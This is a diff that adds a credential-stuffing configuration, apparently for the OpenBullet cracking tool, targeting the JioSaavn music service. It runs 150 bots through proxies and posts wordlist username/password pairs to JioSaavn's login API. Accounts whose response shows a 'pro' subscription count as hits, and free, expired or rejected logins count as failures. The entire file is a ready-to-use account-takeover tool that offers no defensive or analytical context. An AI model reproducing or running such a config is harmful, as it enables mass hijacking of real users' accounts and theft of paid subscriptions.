@@ -1,0 +1,39 @@
+[SETTINGS]
+{
+  "Name": "Saavn ( Zerospace )",
+  "SuggestedBots": 150,
+  "LastModified": "2018-12-23T15:27:47.441425+00:00",
+  "AdditionalInfo": "",
+  "Author": "Zerospace",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#login REQUEST POST "https://www.jiosaavn.com/api.php?__call=user.login&_marker=0" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&&ct=1307289695" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "type='pro'" 
+  KEYCHAIN Failure OR 
+    KEY "type='free'" 
+    KEY "type='expired'" 
+    KEY "=\"Incorrect username/password. Please try again.\" " 
+    KEY "" 
